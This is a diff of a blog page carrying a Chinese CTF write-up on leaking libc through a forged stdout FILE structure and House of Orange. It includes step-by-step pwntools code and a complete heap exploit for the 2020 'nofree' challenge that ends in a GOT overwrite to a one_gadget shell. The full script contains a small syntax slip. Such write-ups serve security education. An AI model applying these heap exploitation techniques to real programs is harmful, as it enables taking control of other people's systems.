@@ -6,15 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: pwn | one day day</title>
+  <title>noshow-nofree | one day day</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="one day day">
-<meta property="og:url" content="http://yoursite.com/tags/pwn/index.html">
+  <meta name="description" content="pwn的堆题中free和show功能在大部分情况下是必不可少的，当程序中有被free的块时可以触发malloc中的管理机制。当我们想要执行system或者是rop，libc的地址都是必不可少的。不过有时候出题人不会给我们free和show此时就只能利用系统自动触发的free和show。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="noshow-nofree">
+<meta property="og:url" content="http://yoursite.com/2020/10/17/noshow-nofree/index.html">
 <meta property="og:site_name" content="one day day">
+<meta property="og:description" content="pwn的堆题中free和show功能在大部分情况下是必不可少的，当程序中有被free的块时可以触发malloc中的管理机制。当我们想要执行system或者是rop，libc的地址都是必不可少的。不过有时候出题人不会给我们free和show此时就只能利用系统自动触发的free和show。">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/gdb.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/noshow-nofree/ex1.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/ex1.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/noshow-nofree/em1_add.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/em1_add.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/noshow-nofree/em1_alloc.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/noshow-nofree/em1_edit.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/em1_edit.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/em1_first.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/em1_second.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/em1_third.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/17/noshow-nofree/em1_forth.png">
+<meta property="article:published_time" content="2020-10-17T12:08:32.000Z">
+<meta property="article:modified_time" content="2020-10-17T12:11:05.832Z">
 <meta property="article:author" content="SPiCa">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/10/17/noshow-nofree/gdb.png">
   
     <link rel="alternative" href="/atom.xml" title="one day day" type="application/atom+xml">
   
@@ -138,36 +156,125 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-noshow-nofree" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      noshow-nofree
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/17/noshow-nofree/" class="archive-article-date">
+
+        
+        <a href="/2020/10/17/noshow-nofree/" class="archive-article-date">
   	<time datetime="2020-10-17T12:08:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-17</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/17/noshow-nofree/">noshow-nofree</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>pwn的堆题中free和show功能在大部分情况下是必不可少的，当程序中有被free的块时可以触发malloc中的管理机制。当我们想要执行system或者是rop，libc的地址都是必不可少的。不过有时候出题人不会给我们free和show此时就只能利用系统自动触发的free和show。</p>
+<a id="more"></a>
+<h1 id="noshow"><a href="#noshow" class="headerlink" title="noshow"></a>noshow</h1><h2 id="IOFILE"><a href="#IOFILE" class="headerlink" title="IOFILE"></a>IOFILE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>程序中与输出有关的文件系统是stdout,所以我们的目标就是它</p>
+<img src="/2020/10/17/noshow-nofree/gdb.png" class="">
 
-        <div class="article-info info-on-right">
-          
+<p>重点关注下面内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line"><span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br></pre></td></tr></table></figure>
+
+<p>glibc中输出函数会根据_flags执行特定的流程，在内部它将_flags作为掩码来进行识别，因此只要满足在特定的bit位置上有相应1就能满足条件。</p>
+<p>用来打印缓冲区的flag</p>
+<blockquote>
+<p> 0xfbad3887</p>
+</blockquote>
+<p>在特定flag下glibc会将_IO_write_base – _IO_write_ptr之间的内容打印出来<br><img src="./noshow-nofree/ex1.png" alt=""></p>
+<img src="/2020/10/17/noshow-nofree/ex1.png" class="">
+<p>总结一下只要我们能修改stdout中的_flag以及_IO_write_base中的后几位就能完成leak</p>
+<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><p>让系统自动触发free的方法House of Orange在<a href="https://wiki.x10sec.org/pwn/heap/house_of_orange/" target="_blank" rel="noopener">wiki</a>上说的很详细</p>
+<p>总结一下House of Orange方法是修改top的size(保证块对齐4k)然系统认为当前堆空间不足然后向系统申请一个更大的块，这时候就会将原来的top进行free。</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>例题才是重点了..</p>
+<h2 id="2020国赛nofree"><a href="#2020国赛nofree" class="headerlink" title="2020国赛nofree"></a>2020国赛nofree</h2><p>名字叫nofree其实也没有show…</p>
+<h3 id="分析一下"><a href="#分析一下" class="headerlink" title="分析一下"></a>分析一下</h3><p>程序中有一个全局变量的结构体 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x6020c0 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> [<span class="number">0x100</span>] buff; <span class="comment">//暂时保存输入的内容</span></span><br><span class="line">	  __int64* str; <span class="comment">// 保存地址</span></span><br><span class="line">	  __int64 <span class="built_in">size</span>; <span class="comment">// 保存长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>添加</strong><br><img src="./noshow-nofree/em1_add.png" alt=""></p>
+<img src="/2020/10/17/noshow-nofree/em1_add.png" class="">
+<p><strong>分配</strong><br><img src="./noshow-nofree/em1_alloc.png" alt=""><br>这个函数内使用了strdup ,这个函数相当于malloc(strlen(src))</p>
+<p><strong>编辑</strong><br><img src="./noshow-nofree/em1_edit.png" alt=""><br>另外限制了index只能是0 1 2</p>
+<img src="/2020/10/17/noshow-nofree/em1_edit.png" class="">
+<p>漏洞挺明显的malloc的接受的长度和输入的字符串一样，但是size是我们自己输入的，如果size&gt;strlen(src)就触发堆溢出的漏洞了。</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul>
+<li>覆写topsize 触发free得到一个fastbin</li>
+<li>利用得到的fastbin分配块到全局变量box中(本题没有PIE)</li>
+<li>再次覆写topsize 触发free得到unsortedbin</li>
+<li>堆溢出修改 unsortedbin中的bk 利用unsorted attack使得main_arena的地址写入box结构体中</li>
+<li>修改刚刚通过unsorted attack得到的位于box中main_arena地址的后4位(远程环境需要爆破一位)改成stdout结构体地址</li>
+<li>修改stdout结构的flag和__IO_write_base leak libc地址</li>
+<li>修改box结构体的一个地址为got-atoi 然后修改成system</li>
+</ul>
+<p><strong>覆写topsize得到fastbin</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1c</span><span class="number">-1</span>):</span><br><span class="line">        add(<span class="number">0x80</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#让地址4k对齐</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="comment"># 触发堆溢出漏洞 strlen(src)&lt;size</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">3</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#覆写top chunk</span></span><br><span class="line">    <span class="comment"># 由于 old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span></span><br><span class="line">    <span class="comment"># 它实际上free的块需要-0x20 因此此处得到的是0x40的chunk</span></span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># malloc一个大于top chunk的块触发free</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/10/17/noshow-nofree/em1_first.png" class="">
+
+<p><strong>利用fastbin attack将块分配到全局变量box</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">data  = <span class="number">0x6021c0</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x41</span>) + p64(data+<span class="number">0x10</span>)      </span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin next指针指向 box</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用box中的size 伪造chunk中的size</span></span><br><span class="line">add(<span class="number">0x41</span>,<span class="number">1</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实际malloc(0x30)</span></span><br><span class="line"><span class="comment"># 分配掉原本的fastbin</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实际malloc(0x30) </span></span><br><span class="line"><span class="comment"># 分配到box</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x30</span>) <span class="comment">#idx == 1</span></span><br></pre></td></tr></table></figure>
+<img src="/2020/10/17/noshow-nofree/em1_second.png" class="">
+<p><strong>再次覆写topchunk得到unsortedbin</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#流程和之前差不多 只是大小有变化</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x18</span><span class="number">-2</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0xb1</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,payload)    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
+<img src="/2020/10/17/noshow-nofree/em1_third.png" class="">
+<p><strong>unsorted attack</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有了unsortedbin后修改bk</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>) +p64(<span class="number">0</span>) + p64(data+<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment"># 然后将这块分配出来触发 unsorted attack</span></span><br><span class="line"><span class="comment"># 这时候位于全局变量box中就有一个main_arena地址了</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/10/17/noshow-nofree/em1_forth.png" class="">
+<p><strong>修改上一部得到的地址为stdout并修改stdout</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="number">0xfbad3887</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 这里是需要爆破的地方</span></span><br><span class="line"> payload = <span class="string">'\x20\x56'</span></span><br><span class="line"></span><br><span class="line"> edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"> payload =  p64(flag) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b'\x50'</span></span><br><span class="line"></span><br><span class="line"> edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>接着随便搞了</p>
+<p>完整exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地环境调试 关闭了aslr所以没有爆破的部分</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(ch)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice&gt;&gt; '</span>,str(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">widx</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'idx: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,idx,content)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    widx(idx)</span><br><span class="line">    io.sendlineafter(<span class="string">'size: '</span>,str(size))</span><br><span class="line">    io.sendafter(<span class="string">'content: '</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    widx(idx)</span><br><span class="line">    io.sendafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x1c</span><span class="number">-1</span>):</span><br><span class="line">        add(<span class="number">0x80</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>) * <span class="number">3</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">    data  = <span class="number">0x6021c0</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x41</span>) + p64(data+<span class="number">0x10</span>)    </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">    add(<span class="number">0x41</span>,<span class="number">1</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)</span><br><span class="line">    <span class="comment">#edit(1,p64(0)*1+p64(0x41)+p64(0)*4)</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x30</span>) <span class="comment">#use idx == 1 </span></span><br><span class="line">    <span class="comment">#create unsroted</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x18</span><span class="number">-2</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0xb1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,payload)    </span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>) +p64(<span class="number">0</span>) + p64(data+<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">1</span>,payload)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">    flag = <span class="number">0xfbad3887</span></span><br><span class="line">    payload = <span class="string">'\x20\x56'</span></span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line">    payload =  p64(flag) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b'\x50'</span></span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line">    leak = io.recvuntil(<span class="string">'1- New'</span>)</span><br><span class="line">    leak = leak[:<span class="number">6</span>]</span><br><span class="line">    leak = leak.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">    libc_base = u64(leak) - (<span class="number">0x7ffff7dd56a3</span><span class="number">-0x7ffff7a48000</span>)</span><br><span class="line">    log.info(<span class="string">"leak - &gt; %s"</span>,hex(libc_base))</span><br><span class="line">    atoi_got = <span class="number">0x602058</span></span><br><span class="line">    libc = ELF(<span class="string">'/home/spica/disk/libc/libc2.23/glibc/libc-2.23/source32/lib/ld-2.23.so'</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(atoi_got)</span><br><span class="line">    edit(<span class="number">2</span>,p64(libc_base+<span class="number">0x3d469</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  exp()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -179,209 +286,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
